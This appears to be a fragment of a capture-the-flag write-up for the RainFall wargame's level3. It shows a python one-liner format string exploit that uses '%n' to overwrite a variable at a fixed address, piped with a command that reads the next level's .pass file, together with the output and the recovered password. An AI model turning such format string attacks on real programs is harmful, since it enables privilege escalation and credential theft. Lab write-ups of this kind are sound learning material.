m  = 0x804988c

    200b7fd1ac0b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

	level3@RainFall:~$ (python -c "print ('\x8c\x98\x04\x08' + '%8.x' * (3) + 'A' * (32 + 4) + '%n')"; echo "cat /home/user/level4/.pass") | ./level3
�     200b7fd1ac0b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa